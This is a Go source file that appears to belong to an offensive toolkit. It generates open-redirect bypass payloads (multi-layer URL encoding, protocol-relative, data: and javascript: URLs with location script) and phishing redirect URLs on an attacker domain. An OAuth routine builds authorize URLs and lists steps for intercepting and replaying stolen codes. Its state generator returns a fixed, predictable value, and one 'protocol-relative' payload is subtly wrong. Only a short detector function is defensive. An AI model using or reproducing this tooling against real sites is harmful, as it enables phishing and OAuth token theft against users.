package redirect

import (
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config RedirectConfig
	mu     sync.Mutex
}

func NewEngine(cfg RedirectConfig) *Engine {
	return &Engine{
		config: cfg,
	}
}

func (e *Engine) ParamManipulation(targetURL string, redirectURL string) (*RedirectResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	payloads := e.generateParamManipulationPayloads(targetURL, redirectURL)

	return &RedirectResult{
		Success:  true,
		Method:   "Param_Manipulation",
		Message:  fmt.Sprintf("Generated %d parameter manipulation payloads for %s", len(payloads), targetURL),
		Duration: time.Since(start),
		Payload:  e.formatPayloads(payloads),
		Risk:     "high",
	}, nil
}

func (e *Engine) generateParamManipulationPayloads(targetURL, redirectURL string) []BypassPayload {
	payloads := make([]BypassPayload, 0)

	payloads = append(payloads, BypassPayload{
		Encoded:   redirectURL,
		Decoded:   redirectURL,
		Evasion:  "direct",
		Technique: "Direct URL",
	})

	encoded := url.QueryEscape(redirectURL)
	payloads = append(payloads, BypassPayload{
		Encoded:   encoded,
		Decoded:   redirectURL,
		Evasion:  "url_encode",
		Technique: "URL Encoding",
	})

	doubleEncoded := url.QueryEscape(url.QueryEscape(redirectURL))
	payloads = append(payloads, BypassPayload{
		Encoded:   doubleEncoded,
		Decoded:   redirectURL,
		Evasion:  "double_url_encode",
		Technique: "Double URL Encoding",
	})

斜杠Bypass := "https:" + "//" + strings.TrimPrefix(redirectURL, "https://")
	payloads = append(payloads, BypassPayload{
		Encoded:   斜杠Bypass,
		Decoded:   redirectURL,
		Evasion:  "protocol_relative",
		Technique: "Protocol Relative",
	})

	dotBypass := targetURL + redirectURL
	payloads = append(payloads, BypassPayload{
		Encoded:   dotBypass,
		Decoded:   redirectURL,
		Evasion:  "path_prefix",
		Technique: "Path Prefix",
	})

	fragmentBypass := redirectURL + "#."
	payloads = append(payloads, BypassPayload{
		Encoded:   fragmentBypass,
		Decoded:   redirectURL,
		Evasion:  "fragment_manipulation",
		Technique: "Fragment Manipulation",
	})

	return payloads
}

func (e *Engine) formatPayloads(payloads []BypassPayload) string {
	var result strings.Builder
	for i, p := range payloads {
		result.WriteString(fmt.Sprintf("[%d] %s: %s\n", i+1, p.Technique, p.Encoded))
	}
	return result.String()
}

func (e *Engine) DoubleURLEncode(redirectURL string) (*RedirectResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	doubleEncoded := url.QueryEscape(url.QueryEscape(redirectURL))
	tripleEncoded := url.QueryEscape(doubleEncoded)

	payloads := []string{
		doubleEncoded,
		tripleEncoded,
		strings.ReplaceAll(url.QueryEscape(redirectURL), "%2F", "%252F"),
		strings.ReplaceAll(url.QueryEscape(redirectURL), "%3A", "%253A"),
	}

	return &RedirectResult{
		Success:  true,
		Method:   "Double_URL_Encode",
		Message:  fmt.Sprintf("Generated %d double-encoded payloads", len(payloads)),
		Duration: time.Since(start),
		Payload:  strings.Join(payloads, "\n"),
		Risk:     "high",
	}, nil
}

func (e *Engine) ProtocolRelative(redirectURL string) (*RedirectResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	payloads := make([]string, 0)

	payloads = append(payloads, "//"+strings.TrimPrefix(redirectURL, "https://"))
	payloads = append(payloads, "//"+strings.TrimPrefix(redirectURL, "http://"))

	parsed, err := url.Parse(redirectURL)
	if err == nil {
		payloads = append(payloads, fmt.Sprintf("//%s%s", parsed.Host, parsed.Path))
	}

	dataURL := "data:text/html,<script>location='" + redirectURL + "'</script>"
	payloads = append(payloads, dataURL)

	javaScriptURL := "javascript:location='" + redirectURL + "'"
	payloads = append(payloads, javaScriptURL)

	return &RedirectResult{
		Success:  true,
		Method:   "Protocol_Relative",
		Message:  fmt.Sprintf("Generated %d protocol-relative payloads", len(payloads)),
		Duration: time.Since(start),
		Payload:  strings.Join(payloads, "\n"),
		Risk:     "high",
	}, nil
}

func (e *Engine) PhishRedirect(targetURL string, phishingDomain string) (*RedirectResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	phishingURLs := e.generatePhishingURLs(targetURL, phishingDomain)

	return &RedirectResult{
		Success:  true,
		Method:   "Phish_Redirect",
		Message:  fmt.Sprintf("Generated %d phishing redirect URLs for %s", len(phishingURLs), phishingDomain),
		Duration: time.Since(start),
		Payload:  strings.Join(phishingURLs, "\n"),
		Risk:     "critical",
	}, nil
}

func (e *Engine) generatePhishingURLs(targetURL, phishingDomain string) []string {
	urls := make([]string, 0)

	urls = append(urls, fmt.Sprintf("https://%s/%s", phishingDomain, url.PathEscape(targetURL)))
	urls = append(urls, fmt.Sprintf("https://%s/?next=%s", phishingDomain, url.QueryEscape(targetURL)))
	urls = append(urls, fmt.Sprintf("https://%s/redirect?url=%s", phishingDomain, url.QueryEscape(targetURL)))

	encodedTarget := base64.StdEncoding.EncodeToString([]byte(targetURL))
	urls = append(urls, fmt.Sprintf("https://%s/sso?token=%s", phishingDomain, encodedTarget))

	return urls
}

func (e *Engine) OAuthTokenLeak(oauthDomain string, clientID string, redirectURI string) (*RedirectResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	state := e.generateState()
	nonce := e.generateState()

	oauthURL := fmt.Sprintf("https://%s/authorize?response_type=code&client_id=%s&redirect_uri=%s&scope=openid+profile+email&state=%s&nonce=%s",
		oauthDomain,
		url.QueryEscape(clientID),
		url.QueryEscape(redirectURI),
		state,
		nonce)

	attackVectors := []string{
		fmt.Sprintf("Intercept code at: %s", redirectURI),
		fmt.Sprintf("Replay state with stolen code"),
		fmt.Sprintf("Manipulate redirect_uri to: %s", redirectURI),
	}

	return &RedirectResult{
		Success:  true,
		Method:   "OAuth_Token_Leak",
		Message:  fmt.Sprintf("OAuth flow constructed: %s", oauthURL[:80]),
		Duration: time.Since(start),
		Payload:  strings.Join(attackVectors, "\n"),
		Risk:     "critical",
	}, nil
}

func (e *Engine) generateState() string {
	b := make([]byte, 16)
	for i := range b {
		b[i] = "0123456789abcdef"[i%16]
	}
	return string(b)
}

func (e *Engine) AnalyzeRedirectURL(rawURL string) (*RedirectURL, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse URL: %v", err)
	}

	params := make(map[string]string)
	for key, vals := range parsed.Query() {
		if len(vals) > 0 {
			params[key] = vals[0]
		}
	}

	return &RedirectURL{
		Raw:      rawURL,
		Scheme:   parsed.Scheme,
		Host:     parsed.Host,
		Path:     parsed.Path,
		Params:   params,
		Fragment: parsed.Fragment,
	}, nil
}

func (e *Engine) DetectOpenRedirect(rawURL string) (bool, string) {
	redirectParams := []string{"url", "redirect", "next", "return", "goto", "continue", "dest", "destination", "redir", "redirect_uri", "return_to"}

	parsed, err := url.Parse(rawURL)
	if err != nil {
		return false, "invalid URL"
	}

	params := parsed.Query()
	for _, param := range redirectParams {
		if val, ok := params[param]; ok && len(val) > 0 {
			redirectURL := val[0]
			if strings.HasPrefix(redirectURL, "http") || strings.HasPrefix(redirectURL, "//") {
				return true, fmt.Sprintf("Open redirect found: %s parameter = %s", param, redirectURL)
			}
		}
	}

	return false, "no open redirect detected"
}

func (e *Engine) GenerateRedirectChain(urls []string) RedirectChain {
	chain := RedirectChain{
		Steps: make([]RedirectStep, 0),
	}

	for i, rawURL := range urls {
		step := RedirectStep{
			URL:        rawURL,
			StatusCode: 302,
			Location:   "",
			NextStep:   i + 1,
		}
		if i < len(urls)-1 {
			step.Location = urls[i+1]
		} else {
			step.StatusCode = 200
			step.NextStep = -1
		}
		chain.Steps = append(chain.Steps, step)
	}

	chain.Total = len(chain.Steps)
	return chain
}
